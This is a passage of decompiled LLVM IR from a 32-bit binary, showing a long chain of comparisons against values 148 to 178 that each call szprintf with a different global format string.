  %v0_804bc54 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bc54 = zext i8 %v0_804bc54 to i32
  %v2_804bc63 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc63, i32* @ebx, align 4
  %v4_804bc75 = call i32 @szprintf(i32 %v2_804bc63, i32 ptrtoint ([13 x i8]* @global_var_80599cd.171 to i32), i32 %v1_804bc54)
  br label %dec_label_pc_804bc7a

dec_label_pc_804bc7a:                             ; preds = %dec_label_pc_804bc41, %dec_label_pc_804bc4a
  %v13_804bc7a = icmp eq i32 %v2_8049ce5, 148
  %v1_804bc81 = icmp eq i1 %v13_804bc7a, false
  br i1 %v1_804bc81, label %dec_label_pc_804bcb3, label %dec_label_pc_804bc83

dec_label_pc_804bc83:                             ; preds = %dec_label_pc_804bc7a
  %v0_804bc83 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bc83 = zext i8 %v0_804bc83 to i32
  store i32 %v1_804bc83, i32* @edx, align 4
  %v0_804bc8d = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bc8d = zext i8 %v0_804bc8d to i32
  %v2_804bc9c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bc9c, i32* @ebx, align 4
  %v4_804bcae = call i32 @szprintf(i32 %v2_804bc9c, i32 ptrtoint ([13 x i8]* @global_var_80599da.172 to i32), i32 %v1_804bc8d)
  br label %dec_label_pc_804bcb3

dec_label_pc_804bcb3:                             ; preds = %dec_label_pc_804bc7a, %dec_label_pc_804bc83
  %v13_804bcb3 = icmp eq i32 %v2_8049ce5, 149
  %v1_804bcba = icmp eq i1 %v13_804bcb3, false
  br i1 %v1_804bcba, label %dec_label_pc_804bcec, label %dec_label_pc_804bcbc

dec_label_pc_804bcbc:                             ; preds = %dec_label_pc_804bcb3
  %v0_804bcbc = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bcbc = zext i8 %v0_804bcbc to i32
  store i32 %v1_804bcbc, i32* @edx, align 4
  %v0_804bcc6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bcc6 = zext i8 %v0_804bcc6 to i32
  %v2_804bcd5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bcd5, i32* @ebx, align 4
  %v4_804bce7 = call i32 @szprintf(i32 %v2_804bcd5, i32 ptrtoint ([14 x i8]* @global_var_80599e7.173 to i32), i32 %v1_804bcc6)
  br label %dec_label_pc_804bcec

dec_label_pc_804bcec:                             ; preds = %dec_label_pc_804bcb3, %dec_label_pc_804bcbc
  %v13_804bcec = icmp eq i32 %v2_8049ce5, 150
  %v1_804bcf3 = icmp eq i1 %v13_804bcec, false
  br i1 %v1_804bcf3, label %dec_label_pc_804bd25, label %dec_label_pc_804bcf5

dec_label_pc_804bcf5:                             ; preds = %dec_label_pc_804bcec
  %v0_804bcf5 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bcf5 = zext i8 %v0_804bcf5 to i32
  store i32 %v1_804bcf5, i32* @edx, align 4
  %v0_804bcff = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bcff = zext i8 %v0_804bcff to i32
  %v2_804bd0e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd0e, i32* @ebx, align 4
  %v4_804bd20 = call i32 @szprintf(i32 %v2_804bd0e, i32 ptrtoint ([14 x i8]* @global_var_80599f5.174 to i32), i32 %v1_804bcff)
  br label %dec_label_pc_804bd25

dec_label_pc_804bd25:                             ; preds = %dec_label_pc_804bcec, %dec_label_pc_804bcf5
  %v13_804bd25 = icmp eq i32 %v2_8049ce5, 151
  %v1_804bd2c = icmp eq i1 %v13_804bd25, false
  br i1 %v1_804bd2c, label %dec_label_pc_804bd5e, label %dec_label_pc_804bd2e

dec_label_pc_804bd2e:                             ; preds = %dec_label_pc_804bd25
  %v0_804bd2e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bd2e = zext i8 %v0_804bd2e to i32
  store i32 %v1_804bd2e, i32* @edx, align 4
  %v0_804bd38 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bd38 = zext i8 %v0_804bd38 to i32
  %v2_804bd47 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd47, i32* @ebx, align 4
  %v4_804bd59 = call i32 @szprintf(i32 %v2_804bd47, i32 ptrtoint ([14 x i8]* @global_var_8059a03.175 to i32), i32 %v1_804bd38)
  br label %dec_label_pc_804bd5e

dec_label_pc_804bd5e:                             ; preds = %dec_label_pc_804bd25, %dec_label_pc_804bd2e
  %v13_804bd5e = icmp eq i32 %v2_8049ce5, 152
  %v1_804bd65 = icmp eq i1 %v13_804bd5e, false
  br i1 %v1_804bd65, label %dec_label_pc_804bd97, label %dec_label_pc_804bd67

dec_label_pc_804bd67:                             ; preds = %dec_label_pc_804bd5e
  %v0_804bd67 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bd67 = zext i8 %v0_804bd67 to i32
  store i32 %v1_804bd67, i32* @edx, align 4
  %v0_804bd71 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bd71 = zext i8 %v0_804bd71 to i32
  %v2_804bd80 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bd80, i32* @ebx, align 4
  %v4_804bd92 = call i32 @szprintf(i32 %v2_804bd80, i32 ptrtoint ([14 x i8]* @global_var_8059834.141 to i32), i32 %v1_804bd71)
  br label %dec_label_pc_804bd97

dec_label_pc_804bd97:                             ; preds = %dec_label_pc_804bd5e, %dec_label_pc_804bd67
  %v13_804bd97 = icmp eq i32 %v2_8049ce5, 153
  %v1_804bd9e = icmp eq i1 %v13_804bd97, false
  br i1 %v1_804bd9e, label %dec_label_pc_804bdd0, label %dec_label_pc_804bda0

dec_label_pc_804bda0:                             ; preds = %dec_label_pc_804bd97
  %v0_804bda0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bda0 = zext i8 %v0_804bda0 to i32
  store i32 %v1_804bda0, i32* @edx, align 4
  %v0_804bdaa = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bdaa = zext i8 %v0_804bdaa to i32
  %v2_804bdb9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdb9, i32* @ebx, align 4
  %v4_804bdcb = call i32 @szprintf(i32 %v2_804bdb9, i32 ptrtoint ([13 x i8]* @global_var_8059a11.176 to i32), i32 %v1_804bdaa)
  br label %dec_label_pc_804bdd0

dec_label_pc_804bdd0:                             ; preds = %dec_label_pc_804bd97, %dec_label_pc_804bda0
  %v13_804bdd0 = icmp eq i32 %v2_8049ce5, 154
  %v1_804bdd7 = icmp eq i1 %v13_804bdd0, false
  br i1 %v1_804bdd7, label %dec_label_pc_804be09, label %dec_label_pc_804bdd9

dec_label_pc_804bdd9:                             ; preds = %dec_label_pc_804bdd0
  %v0_804bdd9 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bdd9 = zext i8 %v0_804bdd9 to i32
  store i32 %v1_804bdd9, i32* @edx, align 4
  %v0_804bde3 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bde3 = zext i8 %v0_804bde3 to i32
  %v2_804bdf2 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bdf2, i32* @ebx, align 4
  %v4_804be04 = call i32 @szprintf(i32 %v2_804bdf2, i32 ptrtoint ([13 x i8]* @global_var_8059a1e.177 to i32), i32 %v1_804bde3)
  br label %dec_label_pc_804be09

dec_label_pc_804be09:                             ; preds = %dec_label_pc_804bdd0, %dec_label_pc_804bdd9
  %v13_804be09 = icmp eq i32 %v2_8049ce5, 155
  %v1_804be10 = icmp eq i1 %v13_804be09, false
  br i1 %v1_804be10, label %dec_label_pc_804be42, label %dec_label_pc_804be12

dec_label_pc_804be12:                             ; preds = %dec_label_pc_804be09
  %v0_804be12 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804be12 = zext i8 %v0_804be12 to i32
  store i32 %v1_804be12, i32* @edx, align 4
  %v0_804be1c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804be1c = zext i8 %v0_804be1c to i32
  %v2_804be2b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be2b, i32* @ebx, align 4
  %v4_804be3d = call i32 @szprintf(i32 %v2_804be2b, i32 ptrtoint ([13 x i8]* @global_var_8059a2b.178 to i32), i32 %v1_804be1c)
  br label %dec_label_pc_804be42

dec_label_pc_804be42:                             ; preds = %dec_label_pc_804be09, %dec_label_pc_804be12
  %v13_804be42 = icmp eq i32 %v2_8049ce5, 156
  %v1_804be49 = icmp eq i1 %v13_804be42, false
  br i1 %v1_804be49, label %dec_label_pc_804be7b, label %dec_label_pc_804be4b

dec_label_pc_804be4b:                             ; preds = %dec_label_pc_804be42
  %v0_804be4b = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804be4b = zext i8 %v0_804be4b to i32
  store i32 %v1_804be4b, i32* @edx, align 4
  %v0_804be55 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804be55 = zext i8 %v0_804be55 to i32
  %v2_804be64 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be64, i32* @ebx, align 4
  %v4_804be76 = call i32 @szprintf(i32 %v2_804be64, i32 ptrtoint ([13 x i8]* @global_var_8059a38.179 to i32), i32 %v1_804be55)
  br label %dec_label_pc_804be7b

dec_label_pc_804be7b:                             ; preds = %dec_label_pc_804be42, %dec_label_pc_804be4b
  %v13_804be7b = icmp eq i32 %v2_8049ce5, 157
  %v1_804be82 = icmp eq i1 %v13_804be7b, false
  br i1 %v1_804be82, label %dec_label_pc_804beb4, label %dec_label_pc_804be84

dec_label_pc_804be84:                             ; preds = %dec_label_pc_804be7b
  %v0_804be84 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804be84 = zext i8 %v0_804be84 to i32
  store i32 %v1_804be84, i32* @edx, align 4
  %v0_804be8e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804be8e = zext i8 %v0_804be8e to i32
  %v2_804be9d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804be9d, i32* @ebx, align 4
  %v4_804beaf = call i32 @szprintf(i32 %v2_804be9d, i32 ptrtoint ([13 x i8]* @global_var_8059a45.180 to i32), i32 %v1_804be8e)
  br label %dec_label_pc_804beb4

dec_label_pc_804beb4:                             ; preds = %dec_label_pc_804be7b, %dec_label_pc_804be84
  %v13_804beb4 = icmp eq i32 %v2_8049ce5, 158
  %v1_804bebb = icmp eq i1 %v13_804beb4, false
  br i1 %v1_804bebb, label %dec_label_pc_804beed, label %dec_label_pc_804bebd

dec_label_pc_804bebd:                             ; preds = %dec_label_pc_804beb4
  %v0_804bebd = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bebd = zext i8 %v0_804bebd to i32
  store i32 %v1_804bebd, i32* @edx, align 4
  %v0_804bec7 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bec7 = zext i8 %v0_804bec7 to i32
  %v2_804bed6 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bed6, i32* @ebx, align 4
  %v4_804bee8 = call i32 @szprintf(i32 %v2_804bed6, i32 ptrtoint ([12 x i8]* @global_var_8059a52.181 to i32), i32 %v1_804bec7)
  br label %dec_label_pc_804beed

dec_label_pc_804beed:                             ; preds = %dec_label_pc_804beb4, %dec_label_pc_804bebd
  %v13_804beed = icmp eq i32 %v2_8049ce5, 159
  %v1_804bef4 = icmp eq i1 %v13_804beed, false
  br i1 %v1_804bef4, label %dec_label_pc_804bf26, label %dec_label_pc_804bef6

dec_label_pc_804bef6:                             ; preds = %dec_label_pc_804beed
  %v0_804bef6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bef6 = zext i8 %v0_804bef6 to i32
  store i32 %v1_804bef6, i32* @edx, align 4
  %v0_804bf00 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bf00 = zext i8 %v0_804bf00 to i32
  %v2_804bf0f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf0f, i32* @ebx, align 4
  %v4_804bf21 = call i32 @szprintf(i32 %v2_804bf0f, i32 ptrtoint ([14 x i8]* @global_var_8059a5e.182 to i32), i32 %v1_804bf00)
  br label %dec_label_pc_804bf26

dec_label_pc_804bf26:                             ; preds = %dec_label_pc_804beed, %dec_label_pc_804bef6
  %v10_804bf26 = icmp eq i32 %v2_8049ce5, 160
  %v1_804bf2d = icmp eq i1 %v10_804bf26, false
  br i1 %v1_804bf2d, label %dec_label_pc_804bf5f, label %dec_label_pc_804bf2f

dec_label_pc_804bf2f:                             ; preds = %dec_label_pc_804bf26
  %v0_804bf2f = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bf2f = zext i8 %v0_804bf2f to i32
  store i32 %v1_804bf2f, i32* @edx, align 4
  %v0_804bf39 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bf39 = zext i8 %v0_804bf39 to i32
  %v2_804bf48 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf48, i32* @ebx, align 4
  %v4_804bf5a = call i32 @szprintf(i32 %v2_804bf48, i32 ptrtoint ([13 x i8]* @global_var_8059a6c.183 to i32), i32 %v1_804bf39)
  br label %dec_label_pc_804bf5f

dec_label_pc_804bf5f:                             ; preds = %dec_label_pc_804bf26, %dec_label_pc_804bf2f
  %v13_804bf5f = icmp eq i32 %v2_8049ce5, 161
  %v1_804bf66 = icmp eq i1 %v13_804bf5f, false
  br i1 %v1_804bf66, label %dec_label_pc_804bf98, label %dec_label_pc_804bf68

dec_label_pc_804bf68:                             ; preds = %dec_label_pc_804bf5f
  %v0_804bf68 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bf68 = zext i8 %v0_804bf68 to i32
  store i32 %v1_804bf68, i32* @edx, align 4
  %v0_804bf72 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bf72 = zext i8 %v0_804bf72 to i32
  %v2_804bf81 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bf81, i32* @ebx, align 4
  %v4_804bf93 = call i32 @szprintf(i32 %v2_804bf81, i32 ptrtoint ([14 x i8]* @global_var_8059a79.184 to i32), i32 %v1_804bf72)
  br label %dec_label_pc_804bf98

dec_label_pc_804bf98:                             ; preds = %dec_label_pc_804bf5f, %dec_label_pc_804bf68
  %v13_804bf98 = icmp eq i32 %v2_8049ce5, 162
  %v1_804bf9f = icmp eq i1 %v13_804bf98, false
  br i1 %v1_804bf9f, label %dec_label_pc_804bfd1, label %dec_label_pc_804bfa1

dec_label_pc_804bfa1:                             ; preds = %dec_label_pc_804bf98
  %v0_804bfa1 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bfa1 = zext i8 %v0_804bfa1 to i32
  store i32 %v1_804bfa1, i32* @edx, align 4
  %v0_804bfab = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bfab = zext i8 %v0_804bfab to i32
  %v2_804bfba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bfba, i32* @ebx, align 4
  %v4_804bfcc = call i32 @szprintf(i32 %v2_804bfba, i32 ptrtoint ([14 x i8]* @global_var_8059a87.185 to i32), i32 %v1_804bfab)
  br label %dec_label_pc_804bfd1

dec_label_pc_804bfd1:                             ; preds = %dec_label_pc_804bf98, %dec_label_pc_804bfa1
  %v13_804bfd1 = icmp eq i32 %v2_8049ce5, 163
  %v1_804bfd8 = icmp eq i1 %v13_804bfd1, false
  br i1 %v1_804bfd8, label %dec_label_pc_804c00a, label %dec_label_pc_804bfda

dec_label_pc_804bfda:                             ; preds = %dec_label_pc_804bfd1
  %v0_804bfda = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804bfda = zext i8 %v0_804bfda to i32
  store i32 %v1_804bfda, i32* @edx, align 4
  %v0_804bfe4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804bfe4 = zext i8 %v0_804bfe4 to i32
  %v2_804bff3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804bff3, i32* @ebx, align 4
  %v4_804c005 = call i32 @szprintf(i32 %v2_804bff3, i32 ptrtoint ([14 x i8]* @global_var_8059a95.186 to i32), i32 %v1_804bfe4)
  br label %dec_label_pc_804c00a

dec_label_pc_804c00a:                             ; preds = %dec_label_pc_804bfd1, %dec_label_pc_804bfda
  %v13_804c00a = icmp eq i32 %v2_8049ce5, 164
  %v1_804c011 = icmp eq i1 %v13_804c00a, false
  br i1 %v1_804c011, label %dec_label_pc_804c043, label %dec_label_pc_804c013

dec_label_pc_804c013:                             ; preds = %dec_label_pc_804c00a
  %v0_804c013 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c013 = zext i8 %v0_804c013 to i32
  store i32 %v1_804c013, i32* @edx, align 4
  %v0_804c01d = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c01d = zext i8 %v0_804c01d to i32
  %v2_804c02c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c02c, i32* @ebx, align 4
  %v4_804c03e = call i32 @szprintf(i32 %v2_804c02c, i32 ptrtoint ([14 x i8]* @global_var_8059a03.175 to i32), i32 %v1_804c01d)
  br label %dec_label_pc_804c043

dec_label_pc_804c043:                             ; preds = %dec_label_pc_804c00a, %dec_label_pc_804c013
  %v13_804c043 = icmp eq i32 %v2_8049ce5, 165
  %v1_804c04a = icmp eq i1 %v13_804c043, false
  br i1 %v1_804c04a, label %dec_label_pc_804c07c, label %dec_label_pc_804c04c

dec_label_pc_804c04c:                             ; preds = %dec_label_pc_804c043
  %v0_804c04c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c04c = zext i8 %v0_804c04c to i32
  store i32 %v1_804c04c, i32* @edx, align 4
  %v0_804c056 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c056 = zext i8 %v0_804c056 to i32
  %v2_804c065 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c065, i32* @ebx, align 4
  %v4_804c077 = call i32 @szprintf(i32 %v2_804c065, i32 ptrtoint ([13 x i8]* @global_var_8059aa3.187 to i32), i32 %v1_804c056)
  br label %dec_label_pc_804c07c

dec_label_pc_804c07c:                             ; preds = %dec_label_pc_804c043, %dec_label_pc_804c04c
  %v13_804c07c = icmp eq i32 %v2_8049ce5, 166
  %v1_804c083 = icmp eq i1 %v13_804c07c, false
  br i1 %v1_804c083, label %dec_label_pc_804c0b5, label %dec_label_pc_804c085

dec_label_pc_804c085:                             ; preds = %dec_label_pc_804c07c
  %v0_804c085 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c085 = zext i8 %v0_804c085 to i32
  store i32 %v1_804c085, i32* @edx, align 4
  %v0_804c08f = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c08f = zext i8 %v0_804c08f to i32
  %v2_804c09e = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c09e, i32* @ebx, align 4
  %v4_804c0b0 = call i32 @szprintf(i32 %v2_804c09e, i32 ptrtoint ([14 x i8]* @global_var_8059ab0.188 to i32), i32 %v1_804c08f)
  br label %dec_label_pc_804c0b5

dec_label_pc_804c0b5:                             ; preds = %dec_label_pc_804c07c, %dec_label_pc_804c085
  %v13_804c0b5 = icmp eq i32 %v2_8049ce5, 167
  %v1_804c0bc = icmp eq i1 %v13_804c0b5, false
  br i1 %v1_804c0bc, label %dec_label_pc_804c0ee, label %dec_label_pc_804c0be

dec_label_pc_804c0be:                             ; preds = %dec_label_pc_804c0b5
  %v0_804c0be = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c0be = zext i8 %v0_804c0be to i32
  store i32 %v1_804c0be, i32* @edx, align 4
  %v0_804c0c8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c0c8 = zext i8 %v0_804c0c8 to i32
  %v2_804c0d7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c0d7, i32* @ebx, align 4
  %v4_804c0e9 = call i32 @szprintf(i32 %v2_804c0d7, i32 ptrtoint ([14 x i8]* @global_var_8059a5e.182 to i32), i32 %v1_804c0c8)
  br label %dec_label_pc_804c0ee

dec_label_pc_804c0ee:                             ; preds = %dec_label_pc_804c0b5, %dec_label_pc_804c0be
  %v13_804c0ee = icmp eq i32 %v2_8049ce5, 168
  %v1_804c0f5 = icmp eq i1 %v13_804c0ee, false
  br i1 %v1_804c0f5, label %dec_label_pc_804c127, label %dec_label_pc_804c0f7

dec_label_pc_804c0f7:                             ; preds = %dec_label_pc_804c0ee
  %v0_804c0f7 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c0f7 = zext i8 %v0_804c0f7 to i32
  store i32 %v1_804c0f7, i32* @edx, align 4
  %v0_804c101 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c101 = zext i8 %v0_804c101 to i32
  %v2_804c110 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c110, i32* @ebx, align 4
  %v4_804c122 = call i32 @szprintf(i32 %v2_804c110, i32 ptrtoint ([14 x i8]* @global_var_8059abe.189 to i32), i32 %v1_804c101)
  br label %dec_label_pc_804c127

dec_label_pc_804c127:                             ; preds = %dec_label_pc_804c0ee, %dec_label_pc_804c0f7
  %v13_804c127 = icmp eq i32 %v2_8049ce5, 169
  %v1_804c12e = icmp eq i1 %v13_804c127, false
  br i1 %v1_804c12e, label %dec_label_pc_804c160, label %dec_label_pc_804c130

dec_label_pc_804c130:                             ; preds = %dec_label_pc_804c127
  %v0_804c130 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c130 = zext i8 %v0_804c130 to i32
  store i32 %v1_804c130, i32* @edx, align 4
  %v0_804c13a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c13a = zext i8 %v0_804c13a to i32
  %v2_804c149 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c149, i32* @ebx, align 4
  %v4_804c15b = call i32 @szprintf(i32 %v2_804c149, i32 ptrtoint ([14 x i8]* @global_var_8059acc.190 to i32), i32 %v1_804c13a)
  br label %dec_label_pc_804c160

dec_label_pc_804c160:                             ; preds = %dec_label_pc_804c127, %dec_label_pc_804c130
  %v13_804c160 = icmp eq i32 %v2_8049ce5, 171
  %v1_804c167 = icmp eq i1 %v13_804c160, false
  br i1 %v1_804c167, label %dec_label_pc_804c199, label %dec_label_pc_804c169

dec_label_pc_804c169:                             ; preds = %dec_label_pc_804c160
  %v0_804c169 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c169 = zext i8 %v0_804c169 to i32
  store i32 %v1_804c169, i32* @edx, align 4
  %v0_804c173 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c173 = zext i8 %v0_804c173 to i32
  %v2_804c182 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c182, i32* @ebx, align 4
  %v4_804c194 = call i32 @szprintf(i32 %v2_804c182, i32 ptrtoint ([14 x i8]* @global_var_8059ada.191 to i32), i32 %v1_804c173)
  br label %dec_label_pc_804c199

dec_label_pc_804c199:                             ; preds = %dec_label_pc_804c160, %dec_label_pc_804c169
  %v13_804c199 = icmp eq i32 %v2_8049ce5, 172
  %v1_804c1a0 = icmp eq i1 %v13_804c199, false
  br i1 %v1_804c1a0, label %dec_label_pc_804c1d2, label %dec_label_pc_804c1a2

dec_label_pc_804c1a2:                             ; preds = %dec_label_pc_804c199
  %v0_804c1a2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c1a2 = zext i8 %v0_804c1a2 to i32
  store i32 %v1_804c1a2, i32* @edx, align 4
  %v0_804c1ac = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c1ac = zext i8 %v0_804c1ac to i32
  %v2_804c1bb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1bb, i32* @ebx, align 4
  %v4_804c1cd = call i32 @szprintf(i32 %v2_804c1bb, i32 ptrtoint ([14 x i8]* @global_var_8059ae8.192 to i32), i32 %v1_804c1ac)
  br label %dec_label_pc_804c1d2

dec_label_pc_804c1d2:                             ; preds = %dec_label_pc_804c199, %dec_label_pc_804c1a2
  %v13_804c1d2 = icmp eq i32 %v2_8049ce5, 173
  %v1_804c1d9 = icmp eq i1 %v13_804c1d2, false
  br i1 %v1_804c1d9, label %dec_label_pc_804c20b, label %dec_label_pc_804c1db

dec_label_pc_804c1db:                             ; preds = %dec_label_pc_804c1d2
  %v0_804c1db = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c1db = zext i8 %v0_804c1db to i32
  store i32 %v1_804c1db, i32* @edx, align 4
  %v0_804c1e5 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c1e5 = zext i8 %v0_804c1e5 to i32
  %v2_804c1f4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c1f4, i32* @ebx, align 4
  %v4_804c206 = call i32 @szprintf(i32 %v2_804c1f4, i32 ptrtoint ([14 x i8]* @global_var_8059af6.193 to i32), i32 %v1_804c1e5)
  br label %dec_label_pc_804c20b

dec_label_pc_804c20b:                             ; preds = %dec_label_pc_804c1d2, %dec_label_pc_804c1db
  %v13_804c20b = icmp eq i32 %v2_8049ce5, 174
  %v1_804c212 = icmp eq i1 %v13_804c20b, false
  br i1 %v1_804c212, label %dec_label_pc_804c244, label %dec_label_pc_804c214

dec_label_pc_804c214:                             ; preds = %dec_label_pc_804c20b
  %v0_804c214 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c214 = zext i8 %v0_804c214 to i32
  store i32 %v1_804c214, i32* @edx, align 4
  %v0_804c21e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c21e = zext i8 %v0_804c21e to i32
  %v2_804c22d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c22d, i32* @ebx, align 4
  %v4_804c23f = call i32 @szprintf(i32 %v2_804c22d, i32 ptrtoint ([13 x i8]* @global_var_8059b04.194 to i32), i32 %v1_804c21e)
  br label %dec_label_pc_804c244

dec_label_pc_804c244:                             ; preds = %dec_label_pc_804c20b, %dec_label_pc_804c214
  %v13_804c244 = icmp eq i32 %v2_8049ce5, 175
  %v1_804c24b = icmp eq i1 %v13_804c244, false
  br i1 %v1_804c24b, label %dec_label_pc_804c27d, label %dec_label_pc_804c24d

dec_label_pc_804c24d:                             ; preds = %dec_label_pc_804c244
  %v0_804c24d = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c24d = zext i8 %v0_804c24d to i32
  store i32 %v1_804c24d, i32* @edx, align 4
  %v0_804c257 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c257 = zext i8 %v0_804c257 to i32
  %v2_804c266 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c266, i32* @ebx, align 4
  %v4_804c278 = call i32 @szprintf(i32 %v2_804c266, i32 ptrtoint ([14 x i8]* @global_var_8059b11.195 to i32), i32 %v1_804c257)
  br label %dec_label_pc_804c27d

dec_label_pc_804c27d:                             ; preds = %dec_label_pc_804c244, %dec_label_pc_804c24d
  %v10_804c27d = icmp eq i32 %v2_8049ce5, 176
  %v1_804c284 = icmp eq i1 %v10_804c27d, false
  br i1 %v1_804c284, label %dec_label_pc_804c2b6, label %dec_label_pc_804c286

dec_label_pc_804c286:                             ; preds = %dec_label_pc_804c27d
  %v0_804c286 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c286 = zext i8 %v0_804c286 to i32
  store i32 %v1_804c286, i32* @edx, align 4
  %v0_804c290 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c290 = zext i8 %v0_804c290 to i32
  %v2_804c29f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c29f, i32* @ebx, align 4
  %v4_804c2b1 = call i32 @szprintf(i32 %v2_804c29f, i32 ptrtoint ([14 x i8]* @global_var_8059b1f.196 to i32), i32 %v1_804c290)
  br label %dec_label_pc_804c2b6

dec_label_pc_804c2b6:                             ; preds = %dec_label_pc_804c27d, %dec_label_pc_804c286
  %v13_804c2b6 = icmp eq i32 %v2_8049ce5, 177
  %v1_804c2bd = icmp eq i1 %v13_804c2b6, false
  br i1 %v1_804c2bd, label %dec_label_pc_804c2ef, label %dec_label_pc_804c2bf

dec_label_pc_804c2bf:                             ; preds = %dec_label_pc_804c2b6
  %v0_804c2bf = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c2bf = zext i8 %v0_804c2bf to i32
  store i32 %v1_804c2bf, i32* @edx, align 4
  %v0_804c2c9 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c2c9 = zext i8 %v0_804c2c9 to i32
  %v2_804c2d8 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c2d8, i32* @ebx, align 4
  %v4_804c2ea = call i32 @szprintf(i32 %v2_804c2d8, i32 ptrtoint ([14 x i8]* @global_var_8059b2d.197 to i32), i32 %v1_804c2c9)
  br label %dec_label_pc_804c2ef

dec_label_pc_804c2ef:                             ; preds = %dec_label_pc_804c2b6, %dec_label_pc_804c2bf
  %v13_804c2ef = icmp eq i32 %v2_8049ce5, 178
  %v1_804c2f6 = icmp eq i1 %v13_804c2ef, false
  br i1 %v1_804c2f6, label %dec_label_pc_804c328, label %dec_label_pc_804c2f8

dec_label_pc_804c2f8:                             ; preds = %dec_label_pc_804c2ef
  %v0_804c2f8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804c2f8 = zext i8 %v0_804c2f8 to i32
  store i32 %v1_804c2f8, i32* @edx, align 4
  %v0_804c302 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804c302 = zext i8 %v0_804c302 to i32
  %v2_804c311 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804c311, i32* @ebx, align 4
